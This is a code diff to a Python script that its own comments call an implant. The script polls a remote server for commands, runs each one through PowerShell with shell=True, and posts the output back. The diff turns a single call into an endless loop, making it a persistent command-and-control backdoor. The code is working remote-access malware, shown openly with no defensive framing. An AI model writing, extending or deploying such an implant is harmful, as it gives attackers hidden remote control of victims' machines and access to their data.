@@ -46,19 +46,22 @@ def get_command(agent_id):
     json = {
         'id': agent_id
     }
+    # receive command from queue
     data = requests.post(f"{base_url}/api/1.1/get_command", json=json).text
     cmd = subprocess.Popen(["powershell.exe", data], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                            stdin=subprocess.PIPE)
     output_bytes = cmd.stdout.read() + cmd.stderr.read()
     output_str = str(output_bytes, "utf-8")  # plain old basic string
     json['output'] = output_str
+    # send the output back to the server
     data = requests.post(f"{base_url}/api/1.1/command_out", json=json)
     print(data.text)
 
 
 if __name__ == "__main__":
+    # register implant with server and receive an ID
     # id_agent = int(register())
-    # print(id_agent)
+    # receive and run commands
     id_agent = 1
-    # while True:
-    get_command(id_agent)
+    while True:
+        get_command(id_agent)
